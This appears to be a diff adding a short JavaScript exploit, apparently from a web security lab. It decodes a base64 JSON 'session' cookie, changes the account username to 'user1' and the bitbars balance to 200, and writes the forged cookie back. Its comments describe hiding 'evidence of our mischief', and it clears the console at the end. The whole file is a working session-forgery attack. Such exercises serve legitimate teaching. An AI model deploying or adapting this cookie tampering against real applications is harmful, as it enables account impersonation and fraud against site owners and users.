@@ -1,0 +1,16 @@
+// Do everything in an immediately invoked function expression so no evidence
+// of our mischief is left behind.
+(function() {
+	function getCookie(key) {
+  const value = "; " + document.cookie;
+  const parts = value.split("; " + key + "=");
+	  if (parts.length == 2) return parts.pop().split(";").shift();
+	};
+	let session_str = getCookie('session')
+	let session= JSON.parse(atob(session_str));
+	session.account.username = "user1";
+	session.account.bitbars = 200;
+	// Overwrite the "session" cookie.
+	document.cookie = "session=" + btoa(JSON.stringify(session));
+})();
+clear();
